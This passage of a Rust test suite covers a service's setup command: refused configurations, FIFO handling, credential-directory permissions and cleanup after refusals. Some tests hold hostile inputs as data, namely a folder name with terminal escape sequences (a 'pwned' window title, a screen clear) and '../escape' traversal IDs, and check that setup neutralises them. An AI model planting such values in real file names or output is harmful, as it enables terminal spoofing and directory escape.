    let paths = Paths::at(&base, base.join("t"), None).unwrap();
    let root = base.join("data\u{1b}]0;pwned\u{7}\u{1b}[2J");
    let id = Registry::open(&paths.locator, &paths.user_temp)
        .unwrap()
        .reserve(None, &root)
        .unwrap()
        .id()
        .to_owned();
    let journal = Journal::open(&base, None).unwrap();
    let input = Input {
        version: 1,
        service: Service::Registered,
        root: root.clone(),
        credentials: None,
        listen: loopback(7420).unwrap(),
    };
    let record = journal
        .freeze(input, false, release_pin().unwrap())
        .unwrap();
    journal
        .write(&Record {
            instance_id: Some(id),
            ..record
        })
        .unwrap();
    drop(journal);
    std::fs::rename(&root, base.join("moved")).unwrap();
    // SAFETY: getegid and geteuid have no preconditions and cannot fail.
    let me = Account {
        uid: unsafe { libc::geteuid() },
        gid: unsafe { libc::getegid() },
    };
    let mut out = Vec::new();
    let refused = reset_for(me, None, || Ok(paths), &mut out).unwrap_err();
    assert!(refused.contains("is unavailable"), "{refused}");
    assert!(
        !refused.contains(char::is_control) && refused.contains("data\\u{1b}]0;pwned\\u{7}"),
        "{refused:?}"
    );
    assert!(
        out.is_empty(),
        "nothing is printed before the instance is found"
    );
}

/// X5 review, second round: a configuration that is not a regular file, and a data folder
/// that is not a directory, are refused at once: a FIFO without a writer is never waited on
/// (a stop signal waits behind such a wait), and nothing is saved.
#[test]
fn a_fifo_is_refused_as_a_configuration_and_as_a_data_folder_without_waiting() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let dir = temp.path().canonicalize().unwrap();
    std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    let fifo = |path: &Path| {
        let name = std::ffi::CString::new(path.as_os_str().as_encoded_bytes()).unwrap();
        // SAFETY: a NUL-terminated path.
        assert_eq!(unsafe { libc::mkfifo(name.as_ptr(), 0o600) }, 0);
    };
    // Each call runs on its own thread, so a wait fails the test instead of hanging it.
    let within = |what: &str, call: Box<dyn FnOnce() -> String + Send>| {
        let (sent, received) = std::sync::mpsc::channel();
        std::thread::spawn(move || sent.send(call()).unwrap());
        received
            .recv_timeout(Duration::from_secs(10))
            .unwrap_or_else(|_| panic!("{what} waited on a FIFO"))
    };
    let file = dir.join("setup.json");
    fifo(&file);
    let refused = within(
        "reading the configuration",
        Box::new(move || configuration(&file).unwrap_err()),
    );
    assert!(
        refused.starts_with("reading the setup configuration ")
            && refused.contains("not a regular file"),
        "{refused}"
    );
    // A directory is no configuration either.
    let refused = configuration(&dir).unwrap_err();
    assert!(refused.contains("not a regular file"), "{refused}");
    // A data folder that is a FIFO, with a credential directory to check against it.
    let root = dir.join("data");
    fifo(&root);
    let secrets = dir.join("secrets");
    std::fs::create_dir(&secrets).unwrap();
    std::fs::set_permissions(&secrets, std::fs::Permissions::from_mode(0o700)).unwrap();
    let input = Input {
        version: 1,
        service: Service::Foreground,
        root: root.clone(),
        credentials: Some(secrets),
        listen: loopback(free_port()).unwrap(),
    };
    let dir_for_records = dir.clone();
    let refused = within(
        "the data folder check",
        Box::new(move || {
            let records = std::fs::File::open(dir_for_records).unwrap();
            preflight(&input, records.as_fd()).unwrap_err()
        }),
    );
    assert!(
        refused.starts_with(&format!("the data folder {}: ", root.display()))
            && refused.ends_with("nothing was saved"),
        "{refused}"
    );
    use std::os::unix::fs::FileTypeExt;
    assert!(std::fs::symlink_metadata(&root)
        .unwrap()
        .file_type()
        .is_fifo());
}

/// A port no other program holds now.
fn free_port() -> u16 {
    std::net::TcpListener::bind(("127.0.0.1", 0))
        .unwrap()
        .local_addr()
        .unwrap()
        .port()
}

/// X5 review V7 and F8: the unit is given exactly the variables that move the instance's
/// paths away from their defaults (the platform's rule, `dirs::location_overrides`, tested
/// there): nothing here knows which system's variables they are.
#[test]
fn a_registered_service_is_given_the_variables_that_moved_its_paths() {
    let home = crate::home::account_dir().unwrap();
    let overrides: Vec<(OsString, OsString)> = org_platform::dirs::location_overrides(&home)
        .unwrap()
        .into_iter()
        .map(|(name, value)| (name.into(), value))
        .collect();
    assert_eq!(path_environment(), overrides);
    let names = org_platform::dirs::location_variables().unwrap();
    for (name, value) in path_environment() {
        assert!(names.contains(&name.to_str().unwrap()), "{name:?}");
        assert_eq!(std::env::var_os(&name).as_ref(), Some(&value));
        assert!(Path::new(&value).is_absolute());
    }
}

/// SIGN-33's words: anyone but root is told to use sudo, with the instance's name; and
/// the foreground mode names the command that works there.
#[test]
fn the_linux_reset_is_roots_and_is_said_in_the_specs_words() {
    assert_eq!(
        reset_needs_root(None),
        "Resetting the administrator's password on Linux needs root. Run it with sudo: sudo \
         agentic-org admin reset"
    );
    assert_eq!(
        reset_needs_root(Some("lab")),
        "Resetting the administrator's password on Linux needs root. Run it with sudo: sudo \
         agentic-org admin reset --name lab"
    );
    // A name of the account database is shown as it is; anything else as its number.
    assert_eq!(account_name(0), "root");
    assert_eq!(account_name(u32::MAX - 7), format!("uid {}", u32::MAX - 7));
}

/// The configuration file is read strictly and read-only, and says what it is missing.
#[test]
fn a_configuration_file_is_read_without_changing_anything() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("setup.json");
    let missing = configuration(&file).unwrap_err();
    assert!(
        missing.starts_with("reading the setup configuration "),
        "{missing}"
    );
    std::fs::write(&file, b"{\"version\": 1}").unwrap();
    let refused = configuration(&file).unwrap_err();
    assert!(
        refused.contains("\"service\": \"registered\" or \"foreground\"")
            && refused.ends_with("nothing was changed"),
        "{refused}"
    );
    std::fs::write(
        &file,
        br#"{"version":1,"service":"registered","root":"/srv/agentic/instance",
            "listen":{"address":"127.0.0.1","port":7420,"scheme":"http_loopback",
                      "origin":"http://127.0.0.1:7420","hsts":"off"}}"#,
    )
    .unwrap();
    let registered = configuration(&file).unwrap();
    assert!(!registered.foreground());
    // HTTPS is read; a pair named for plain HTTP is refused before anything is made.
    let https = temp.path().join("https.json");
    std::fs::write(
        &https,
        br#"{"version":1,"service":"registered","root":"/srv/agentic/instance",
            "listen":{"address":"0.0.0.0","port":8443,"scheme":"https",
                      "origin":"https://office.example:8443","hsts":"off"}}"#,
    )
    .unwrap();
    assert!(!configuration(&https).unwrap().foreground());
    std::fs::write(
        &https,
        br#"{"version":1,"service":"registered","root":"/srv/agentic/instance",
            "listen":{"address":"127.0.0.1","port":7420,"scheme":"http_loopback",
                      "origin":"http://127.0.0.1:7420","hsts":"off"},
            "tls":{"cert":"/tls/cert.pem","key":"/tls/key.pem"}}"#,
    )
    .unwrap();
    let refused = configuration(&https).unwrap_err();
    assert!(
        refused.contains("only \"scheme\": \"https\" serves")
            && refused.ends_with("nothing was changed"),
        "{refused}"
    );
    std::fs::remove_file(&https).unwrap();
    assert_eq!(
        std::fs::read_dir(temp.path()).unwrap().count(),
        1,
        "reading made a file"
    );
}

mod credentials {
    //! The credential directory setup makes and records (ADR-0017 decision 8).
    use std::fs;
    use std::os::unix::fs::MetadataExt;

    use org_platform::service::{Registration, ServiceError};
    use org_platform_host::credentials::{protected_store, ProtectedStore};
    use org_platform_host::testing::credentials::release_directory_below;

    use super::*;

    /// A private application base on disk, and a reserved instance in it.
    struct Account {
        base: PathBuf,
        _temp: tempfile::TempDir,
    }

    fn account_in(shared: &Path) -> Account {
        let temp = tempfile::tempdir_in(shared).unwrap();
        let base = temp.path().canonicalize().unwrap();
        fs::set_permissions(&base, fs::Permissions::from_mode(0o700)).unwrap();
        Account { base, _temp: temp }
    }

    fn account() -> Account {
        account_in(&org_platform::dirs::testing::disk_backed_temp().unwrap())
    }

    fn mode(path: &Path) -> u32 {
        fs::symlink_metadata(path).unwrap().mode() & 0o7777
    }

    fn release_directory_system() -> bool {
        protected_store() == Ok(ProtectedStore::ReleaseDirectory)
    }

    /// X5 review V-a: a development build records the system's credential directory as a
    /// release build does (these tests are a development build), so that its registered
    /// service keeps its secrets there and needs no development key folder; where the
    /// system keeps them in the Keychain, none.
    #[test]
    fn every_build_records_the_systems_credential_directory() {
        let home = Path::new("/home/someone");
        let found = CredentialDirectory::for_host(home);
        if release_directory_system() {
            assert_eq!(
                found,
                Ok(CredentialDirectory::Below(
                    org_platform::dirs::credential_directory_base(home).unwrap()
                ))
            );
        } else {
            assert_eq!(found, Ok(CredentialDirectory::Unused));
        }
    }

    /// X5 review, fourth round, P2-6: the check preflight asks before anything is reserved
    /// leaves nothing it made, when it passes as when it refuses: the directories of the
    /// store, and the store's lock file in a store directory that existed without one.
    #[test]
    fn a_question_asked_before_the_reservation_leaves_nothing_it_made() {
        if !release_directory_system() {
            println!("skipped: this system keeps no secrets in a directory");
            return;
        }
        let account = account();
        let data = account.base.join("data");
        fs::create_dir(&data).unwrap();
        fs::set_permissions(&data, fs::Permissions::from_mode(0o700)).unwrap();
        let data_root = fs::File::open(&data).unwrap();
        let data_fd = || std::os::fd::AsFd::as_fd(&data_root);
        let enter = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
            release_directory_below(&account.base, location)
        };
        let credentials = account.base.join("state/agentic-org/credentials/x");
        let before = tree(&account.base);
        assert_eq!(
            credential_directory(&credentials, data_fd(), &account.base, false, enter),
            Ok(credentials.clone())
        );
        assert_eq!(tree(&account.base), before, "the probe left what it made");
        // A store directory that exists keeps no lock file the probe made.
        fs::create_dir_all(&credentials).unwrap();
        for dir in [
            "state",
            "state/agentic-org",
            "state/agentic-org/credentials",
            "state/agentic-org/credentials/x",
        ] {
            fs::set_permissions(account.base.join(dir), fs::Permissions::from_mode(0o700)).unwrap();
        }
        let before = tree(&account.base);
        assert_eq!(
            credential_directory(&credentials, data_fd(), &account.base, false, enter),
            Ok(credentials.clone())
        );
        assert_eq!(tree(&account.base), before, "the probe left its lock file");
        // The reservation's own check keeps them.
        assert_eq!(
            use_credential_directory(&credentials, data_fd(), &account.base, enter),
            Ok(credentials.clone())
        );
        assert!(credentials.join(".lock").exists());
    }

    #[test]
    fn setup_makes_the_directory_owner_only_with_its_parents_and_checks_it_as_the_host_will() {
        let account = account();
        let data = account.base.join("data");
        fs::create_dir(&data).unwrap();
        fs::set_permissions(&data, fs::Permissions::from_mode(0o700)).unwrap();
        let data_root = fs::File::open(&data).unwrap();
        let data_fd = || std::os::fd::AsFd::as_fd(&data_root);
        let id = crate::ids::uuid_v7().unwrap();
        // Neither `state` nor anything below it exists yet.
        let credentials = account.base.join("state/agentic-org/credentials");
        let enter = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
            release_directory_below(&account.base, location)
        };

        if !release_directory_system() {
            // The platform refuses a release directory here, so setup refuses too.
            let before = tree(&account.base);
            let refused =
                make_credential_directory(&credentials, &id, data_fd(), &account.base, enter);
            assert!(refused.unwrap_err().contains("cannot be used"));
            assert_eq!(
                tree(&account.base),
                before,
                "a refused location kept something"
            );
            return;
        }
        let made =
            make_credential_directory(&credentials, &id, data_fd(), &account.base, enter).unwrap();
        assert_eq!(made, credentials.join(&id));
        for dir in [
            account.base.join("state"),
            account.base.join("state/agentic-org"),
            credentials.clone(),
            made.clone(),
        ] {
            assert_eq!(mode(&dir), 0o700, "{}", dir.display());
            assert_eq!(
                fs::symlink_metadata(&dir).unwrap().uid(),
                crate::home::euid()
            );
        }
        // The check opened it as the host does: its lock is there, and nothing else.
        let entries: Vec<_> = fs::read_dir(&made)
            .unwrap()
            .map(|entry| entry.unwrap().file_name())
            .collect();
        assert_eq!(entries, [".lock"]);
        // A second run finds the same directory and leaves it as it is.
        assert_eq!(
            make_credential_directory(&credentials, &id, data_fd(), &account.base, enter).unwrap(),
            made
        );
        // A base spelled with `.` or a repeated separator is the same directory, in the
        // one spelling the record accepts.
        let spelled = PathBuf::from(format!(
            "{}//state/./agentic-org/credentials/",
            account.base.display()
        ));
        assert_eq!(
            make_credential_directory(&spelled, &id, data_fd(), &account.base, enter).unwrap(),
            made
        );

        // A directory the host would refuse is refused now, in the host's words, and is
        // not repaired.
        fs::set_permissions(&made, fs::Permissions::from_mode(0o750)).unwrap();
        let refused = make_credential_directory(&credentials, &id, data_fd(), &account.base, enter)
            .unwrap_err();
        assert_eq!(
            refused,
            format!(
                "the credential directory cannot be used: {}: the credential directory's mode \
                 is not 0700",
                made.display()
            )
        );
        assert_eq!(mode(&made), 0o750);
        // No absolute base, a base with `..`, or an instance ID that is none: nothing is
        // made and nothing is opened.
        let before = tree(&account.base);
        let dotted = account.base.join("state/../elsewhere");
        for (base, instance) in [
            (Path::new("relative/credentials"), id.as_str()),
            (dotted.as_path(), id.as_str()),
            (credentials.as_path(), "../escape"),
            (credentials.as_path(), ""),
        ] {
            let never = |_: org_platform_host::credentials::ReleaseDirectory<'_>| panic!("opened");
            assert!(
                make_credential_directory(base, instance, data_fd(), &account.base, never).is_err()
            );
        }
        assert_eq!(tree(&account.base), before);
    }

    /// Every path below `root` with its kind and mode, sorted: what a refused location
    /// must leave exactly as it was.
    fn tree(root: &Path) -> Vec<(PathBuf, bool, u32)> {
        let mut found = Vec::new();
        let mut pending = vec![root.to_owned()];
        while let Some(path) = pending.pop() {
            let meta = fs::symlink_metadata(&path).unwrap();
            found.push((path.clone(), meta.is_dir(), meta.mode()));
            if meta.is_dir() {
                pending.extend(fs::read_dir(&path).unwrap().map(|e| e.unwrap().path()));
            }
        }
        found.sort();
        found
    }

    /// X3 review S4: a location that is refused leaves nothing behind, whichever rule
    /// refuses it and however far the walk came. On every system: the rules that make
    /// nothing are the host's own, and the platform's check is given by the test.
    #[test]
    fn a_refused_location_is_left_exactly_as_it_was_found() {
        let account = account();
        let data = account.base.join("data");
        let other = account.base.join("other");
        for dir in [&data, &other] {
            fs::create_dir(dir).unwrap();
            fs::set_permissions(dir, fs::Permissions::from_mode(0o700)).unwrap();
        }
        std::os::unix::fs::symlink(&other, account.base.join("link")).unwrap();
        fs::write(account.base.join("file"), b"x").unwrap();
        let open = account.base.join("open");
        fs::create_dir(&open).unwrap();
        fs::set_permissions(&open, fs::Permissions::from_mode(0o777)).unwrap();
        let data_root = fs::File::open(&data).unwrap();
        let data_fd = || std::os::fd::AsFd::as_fd(&data_root);
        let id = crate::ids::uuid_v7().unwrap();
        let before = tree(&account.base);
        let never =
            |_: org_platform_host::credentials::ReleaseDirectory<'_>| -> Result<
                org_platform_host::credentials::ReleaseRoot,
                org_platform_host::credentials::CredentialError,
            > { panic!("the platform was asked about a location the walk refused") };

        // Inside the data root, at any depth; through a symbolic link; below a file; below
        // a directory that others can write to. Nothing is made for any of them.
        for (base, rule) in [
            (data.join("credentials"), "is inside the data root"),
            (data.join("a/b/credentials"), "is inside the data root"),
            (account.base.join("link/credentials"), "is not a directory"),
            (account.base.join("file/credentials"), "is not a directory"),
            (open.join("state/credentials"), "is writable by others"),
        ] {
            let refused =
                make_credential_directory(&base, &id, data_fd(), &account.base, never).unwrap_err();
            assert!(
                refused.starts_with("the credential directory cannot be used: ")
                    && refused.contains(rule),
                "{}: {refused}",
                base.display()
            );
            assert_eq!(tree(&account.base), before, "{}", base.display());
        }
        assert!(fs::read_dir(&other).unwrap().next().is_none());

        // The walk passes and makes four directories; then the platform's check refuses
        // (as it does for a filesystem that cannot hold a store). All four are gone again.
        let state = account.base.join("state/agentic-org/credentials");
        let refusing = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
            assert!(
                location.path.is_dir(),
                "the directory exists when it is checked"
            );
            assert!(!location.mount_point_required && !location.expect_items);
            // What the platform's check leaves in a store it opened.
            fs::write(location.path.join(".lock"), b"").unwrap();
            Err(org_platform_host::credentials::CredentialError::Unsafe)
        };
        let refused =
            make_credential_directory(&state, &id, data_fd(), &account.base, refusing).unwrap_err();
        assert!(
            refused.starts_with("the credential directory cannot be used: "),
            "{refused}"
        );
        assert_eq!(tree(&account.base), before);

        // Directories that existed before a refusal stay, with what they hold.
        fs::create_dir_all(account.base.join("state/agentic-org")).unwrap();
        fs::write(account.base.join("state/keep"), b"x").unwrap();
        let before = tree(&account.base);
        assert!(
            make_credential_directory(&state, &id, data_fd(), &account.base, refusing).is_err()
        );
        assert_eq!(tree(&account.base), before);

        // The walk itself: how many directories it made, and that it follows no link.
        let made =
            store_directories::make(&state.join(&id), Some(data_fd()), &account.base).unwrap();
        assert_eq!(made.count(), 2);
        assert_eq!(mode(&state.join(&id)), 0o700);
        made.remove();
        assert_eq!(tree(&account.base), before);
        assert!(
            store_directories::make(Path::new("/elsewhere/x"), Some(data_fd()), &account.base)
                .unwrap_err()
                .contains("is not below")
        );
    }

    /// The foreground mode: the credential directory is a mounted volume. Setup never
    /// makes it, asks the platform to require the mount, and says so when it is refused.
    #[test]
    fn in_the_foreground_mode_setup_makes_no_credential_directory_and_requires_a_mount() {
        let account = account();
        let data = account.base.join("data");
        fs::create_dir(&data).unwrap();
        fs::set_permissions(&data, fs::Permissions::from_mode(0o700)).unwrap();
        let data_root = fs::File::open(&data).unwrap();
        let data_fd = || std::os::fd::AsFd::as_fd(&data_root);
        let secrets = account.base.join("secrets");
        let before = tree(&account.base);
        let asked = std::cell::Cell::new(0);
        let refusing = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
            asked.set(asked.get() + 1);
            assert_eq!(location.path, secrets.as_path());
            assert!(location.mount_point_required, "the mount is required");
            assert!(!location.expect_items);
            assert!(!location.path.exists(), "setup made the directory");
            Err(org_platform_host::credentials::CredentialError::Unsafe)
        };
        let refused = check_mounted_store(&secrets, data_fd(), refusing).unwrap_err();
        assert_eq!(asked.get(), 1);
        assert!(
            refused.starts_with("the credential directory cannot be used: ")
                && refused.contains("mounted volume")
                && refused.contains("setup does not make it"),
            "{refused}"
        );
        assert_eq!(tree(&account.base), before);
        // The registered mode makes the directory at exactly the configured path and does
        // not require a mount.
        let lenient = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
            assert!(!location.mount_point_required);
            assert!(location.path.is_dir());
            Err(org_platform_host::credentials::CredentialError::Unsafe)
        };
        let refused =
            use_credential_directory(&secrets, data_fd(), &account.base, lenient).unwrap_err();
        assert!(!refused.contains("mounted volume"), "{refused}");
        assert_eq!(tree(&account.base), before, "a refused directory was kept");
        // On this system, with the platform's own check: a plain directory is not a mount.
        if release_directory_system() {
            fs::create_dir(&secrets).unwrap();
            fs::set_permissions(&secrets, fs::Permissions::from_mode(0o700)).unwrap();
            let enter = |location: org_platform_host::credentials::ReleaseDirectory<'_>| {
                release_directory_below(&account.base, location)
            };
            let refused =
                check_mounted_store(&secrets, data_fd(), |location| enter(location).map(drop))
                    .unwrap_err();
            println!("a plain directory in the foreground mode: {refused}");
            assert!(refused.contains("mount"), "{refused}");
            assert_eq!(
                use_credential_directory(&secrets, data_fd(), &account.base, enter),
                Ok(secrets.clone())
            );
        }
    }

    /// A service manager that registers nothing: setup stops there, after its third step.
    struct NoService;
    impl ServiceManager for NoService {
        fn register(&self, _unit: &Unit) -> Result<Registration, ServiceError> {
            Err(ServiceError::System(
                "no service manager in this test".into(),
            ))
        }
        fn start(&self, _instance_id: &str) -> Result<(), ServiceError> {
            unreachable!("nothing was registered")
        }
        fn stop(&self, _instance_id: &str) -> Result<(), ServiceError> {
            unreachable!("nothing was registered")
        }
        fn status(&self, _instance_id: &str) -> Result<ServiceStatus, ServiceError> {
            unreachable!("nothing was registered")
        }
        fn unregister(&self, _instance_id: &str) -> Result<(), ServiceError> {
            unreachable!("nothing was registered")
        }
    }

    fn free_port() -> u16 {
        std::net::TcpListener::bind(("127.0.0.1", 0))
            .unwrap()
            .local_addr()
            .unwrap()
            .port()
    }

    /// Runs setup in `account` with a credential directory below `state`, up to the
    /// service step, which this test's manager refuses.
    fn run_setup(
        account: &Account,
        state: &Path,
        port: u16,
    ) -> (Result<Option<crate::BrowserListener>, String>, String) {
        // The user temp base has a short path of its own (socket paths are bounded).
        let temp = account._temp.path().canonicalize().unwrap().join("t");
        if !temp.exists() {
            fs::create_dir(&temp).unwrap();
            fs::set_permissions(&temp, fs::Permissions::from_mode(0o700)).unwrap();
        }
        let paths = Paths::at(&account.base, temp, None).unwrap();
        let platform = Platform {
            service: Box::new(NoService),
            disk: Box::new(org_platform::testing::FakeDiskEncryption(
                EncryptionState::On,
            )),
            credentials: CredentialDirectory::Below(state.to_owned()),
        };
        let request = Request {
            name: None,
            port: Some(port),
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            development_keys: None,
            configuration: None,
        };
        let mut out = Vec::new();
        let result = run_at(&paths, &platform, request, &mut out);
        (result, String::from_utf8(out).unwrap())
    }

    /// X5 review, second round: a setup from a file that is refused after its instance was
    /// reserved (here by the platform's credential directory, which the host would refuse)
    /// leaves no record and says what stays reserved, and the same file continues once the
    /// cause is gone.
    #[test]
    fn a_file_refused_after_its_reservation_says_what_stays_reserved_and_then_continues() {
        let account = account();
        let temp = account.base.join("t");
        fs::create_dir(&temp).unwrap();
        fs::set_permissions(&temp, fs::Permissions::from_mode(0o700)).unwrap();
        let paths = Paths::at(&account.base, temp, None).unwrap();
        let port = free_port();
        let input = Input {
            version: 1,
            service: Service::Registered,
            root: account.base.join("data"),
            credentials: None,
            listen: loopback(port).unwrap(),
        };
        let run = |credentials: CredentialDirectory| {
            let platform = Platform {
                service: Box::new(NoService),
                disk: Box::new(org_platform::testing::FakeDiskEncryption(
                    EncryptionState::On,
                )),
                credentials,
            };
            let request = Request {
                name: None,
                port: None,
                prompt: None,
                named_port_base: NAMED_PORT_BASE,
                program: PathBuf::from("/no-such-program"),
                env: Vec::new(),
                terminal: false,
                development_keys: Some(account.base.join("keys")),
                configuration: Some(Configuration::from(input.clone())),
            };
            let mut out = Vec::new();
            run_at(&paths, &platform, request, &mut out)
        };
        // Below a shared temporary directory, which others can write to: refused after the
        // reservation, since the directory is named by the instance's ID.
        let state = account.base.join("state");
        let refused = run(CredentialDirectory::Below(state.clone())).unwrap_err();
        assert!(
            refused.starts_with("the credential directory cannot be used: "),
            "{refused}"
        );
        assert!(
            refused.ends_with(&format!(
                "; instance \"default\" stays reserved with the data folder {} and the address \
                 http://127.0.0.1:{port}: run setup again with a file that keeps both (it may \
                 change the credential directory); another data folder or address needs the \
                 instance removed, which no command offers yet",
                account.base.join("data").display()
            )),
            "{refused}"
        );
        assert!(
            Journal::snapshot(&account.base, None).is_err(),
            "the record was kept"
        );
        assert!(!state.exists());
        // Once the cause is gone the same file continues, up to the service, which this
        // test's manager refuses.
        let stopped = run(CredentialDirectory::Unused).unwrap_err();
        assert!(stopped.starts_with("registering the service"), "{stopped}");
        let record = Journal::snapshot(&account.base, None).unwrap();
        assert_eq!(record.input, input);
        assert!(record.instance_id.is_some());
    }

    /// X5 review, fourth round, P1-3 (setup's side): the credential directory is checked
    /// apart from the account's records, as the host checks it at every start: one inside
    /// the application base, which holds the setup record and the instance locator, is
    /// refused before any instance is recorded with it.
    #[test]
    fn a_credential_directory_among_the_accounts_records_is_refused() {
        if !release_directory_system() {
            println!("skipped: this system keeps no secrets in a directory");
            return;
        }
        // <target>/<profile>/deps/<test binary>: a place whose ancestors may pass the rule.
        let executable = std::env::current_exe().unwrap().canonicalize().unwrap();
        let tmp = executable.ancestors().nth(3).unwrap().join("tmp");
        if fs::create_dir_all(&tmp).is_err() {
            println!("skipped: {} cannot be made", tmp.display());
            return;
        }
        let base_dir = tempfile::tempdir_in(&tmp).unwrap();
        // The base is below cargo's target folder, a long path on a CI runner; the user temp
        // base, where the sockets go, is short (their paths are bounded).
        let account = Account {
            base: base_dir.path().canonicalize().unwrap(),
            _temp: tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap())
                .unwrap(),
        };
        fs::set_permissions(&account.base, fs::Permissions::from_mode(0o700)).unwrap();
        let (result, _) = run_setup(&account, &account.base.join("state"), free_port());
        let refused = result.unwrap_err();
        if refused.contains("writable by others") || refused.contains("owned by another") {
            println!("skipped: no directory here passes the ancestor rule: {refused}");
            return;
        }
        assert!(
            refused.starts_with("the credential directory cannot be used: ")
                && refused.contains("account's records"),
            "{refused}"
        );
        let record = Journal::snapshot(&account.base, None).unwrap();
        assert_eq!(record.credentials, None);
    }

    /// X5 review, fifth round, P3-b: a registered setup whose file names a credential
    /// directory already bound to another instance is refused before anything is saved,
    /// as the host would refuse it at the service's first start; the binding is untouched.
    #[test]
    fn a_configured_credential_directory_bound_to_another_instance_is_refused() {
        if !release_directory_system() {
            println!("skipped: this system keeps no secrets in a directory");
            return;
        }
        // <target>/<profile>/deps/<test binary>: a place whose ancestors may pass the rule.
        let executable = std::env::current_exe().unwrap().canonicalize().unwrap();
        let tmp = executable.ancestors().nth(3).unwrap().join("tmp");
        if fs::create_dir_all(&tmp).is_err() {
            println!("skipped: {} cannot be made", tmp.display());
            return;
        }
        let home_dir = tempfile::tempdir_in(&tmp).unwrap();
        let home = home_dir.path().canonicalize().unwrap();
        fs::set_permissions(&home, fs::Permissions::from_mode(0o755)).unwrap();
        let account = Account {
            base: home.join("share"),
            _temp: tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap())
                .unwrap(),
        };
        fs::create_dir(&account.base).unwrap();
        fs::set_permissions(&account.base, fs::Permissions::from_mode(0o700)).unwrap();
        let bound = home.join("credentials");
        fs::create_dir(&bound).unwrap();
        fs::set_permissions(&bound, fs::Permissions::from_mode(0o700)).unwrap();
        let marker = bound.join(".instance");
        fs::write(&marker, "another-instance").unwrap();
        fs::set_permissions(&marker, fs::Permissions::from_mode(0o600)).unwrap();

        let temp = account._temp.path().canonicalize().unwrap().join("t");
        fs::create_dir(&temp).unwrap();
        fs::set_permissions(&temp, fs::Permissions::from_mode(0o700)).unwrap();
        let paths = Paths::at(&account.base, temp, None).unwrap();
        let platform = Platform {
            service: Box::new(NoService),
            disk: Box::new(org_platform::testing::FakeDiskEncryption(
                EncryptionState::On,
            )),
            credentials: CredentialDirectory::Below(home.join("state")),
        };
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            development_keys: None,
            configuration: Some(Configuration::from(Input {
                version: 1,
                service: Service::Registered,
                root: home.join("data"),
                credentials: Some(bound.clone()),
                listen: loopback(free_port()).unwrap(),
            })),
        };
        let refused = run_at(&paths, &platform, request, &mut Vec::new()).unwrap_err();
        if refused.contains("writable by others") || refused.contains("owned by another") {
            println!("skipped: no directory here passes the ancestor rule: {refused}");
            return;
        }
        assert!(
            refused.starts_with("the credential directory cannot be used: ")
                && refused.contains("already bound to another instance")
                && refused.ends_with("; nothing was saved"),
            "{refused}"
        );
        assert!(
            Journal::snapshot(&account.base, None).is_err(),
            "a record was saved"
        );
        assert_eq!(fs::read_to_string(&marker).unwrap(), "another-instance");
        assert!(!bound.join(".lock").exists());
    }

    /// Setup on this machine, with the host's own walk from `/`. A credential directory
    /// below a shared temporary directory is one the host would refuse (that directory is
    /// writable by others): setup refuses it in the host's words and saves no instance.
    /// Where cargo's test directory passes the walk, setup makes the directory there,
    /// records it with the instance, and a second run keeps it.
    #[test]
    fn setup_records_the_directory_once_with_the_instance_and_refuses_one_the_host_would() {
        let shared = account();
        let port = free_port();
        let state = shared.base.join("state/agentic-org/credentials");
        let (result, _) = run_setup(&shared, &state, port);
        let refused = result.unwrap_err();
        assert!(
            refused.starts_with("the credential directory cannot be used: "),
            "{refused}"
        );
        // Nothing was saved: no instance is recorded without its credential directory.
        let record = Journal::snapshot(&shared.base, None).unwrap();
        assert_eq!((record.instance_id, record.credentials), (None, None));
        if !release_directory_system() {
            return;
        }
        assert!(refused.contains("is writable by others"), "{refused}");

        // <target>/<profile>/deps/<test binary>
        let executable = std::env::current_exe().unwrap().canonicalize().unwrap();
        let tmp = executable.ancestors().nth(3).unwrap().join("tmp");
        if fs::create_dir_all(&tmp).is_err() {
            println!("skipped: {} cannot be made", tmp.display());
            return;
        }
        let Ok(temp) = tempfile::tempdir_in(&tmp) else {
            println!("skipped: nothing can be made in {}", tmp.display());
            return;
        };
        let clean = Account {
            base: temp.path().canonicalize().unwrap(),
            _temp: temp,
        };
        // The application base is private; the credential directory is next to it, below a
        // directory of this user that others can pass through, as a home directory is.
        let home = clean.base.clone();
        fs::set_permissions(&home, fs::Permissions::from_mode(0o755)).unwrap();
        let account = Account {
            base: home.join("share"),
            _temp: tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap())
                .unwrap(),
        };
        fs::create_dir(&account.base).unwrap();
        fs::set_permissions(&account.base, fs::Permissions::from_mode(0o700)).unwrap();
        let state = home.join("state/agentic-org/credentials");
        let (result, out) = run_setup(&account, &state, port);
        let stopped = result.unwrap_err();
        if stopped.starts_with("the credential directory cannot be used: ") {
            println!("skipped: no directory here passes the ancestor rule: {stopped}");
            return;
        }
        assert!(stopped.starts_with("registering the service"), "{stopped}");
        let record = Journal::snapshot(&account.base, None).unwrap();
        let id = record
            .instance_id
            .clone()
            .expect("the instance is recorded");
        let directory = state.join(&id);
        assert_eq!(record.credentials.as_deref(), Some(directory.as_path()));
        assert!(
            out.contains(&format!("Secrets: {}\n", directory.display())),
            "{out}"
        );
        assert_eq!(mode(&directory), 0o700);
        assert_eq!(mode(&state), 0o700);
        // Outside the data root.
        assert!(!directory.starts_with(&record.input.root));
        // A second run, with another state folder in its platform (as if `XDG_STATE_HOME`
        // had changed): the record's directory stays, and nothing is made elsewhere.
        let other = home.join("other-state/agentic-org/credentials");
        let (result, out) = run_setup(&account, &other, port);
        assert!(result.unwrap_err().starts_with("registering the service"));
        assert_eq!(Journal::snapshot(&account.base, None).unwrap(), record);
        assert!(
            out.contains(&format!("Secrets: {}\n", directory.display())),
            "{out}"
        );
        assert!(!home.join("other-state").exists());
        println!("setup recorded {}", directory.display());
    }
}

/// X5 review, fourth round, P1-4: a foreground start after the instance's runtime folders
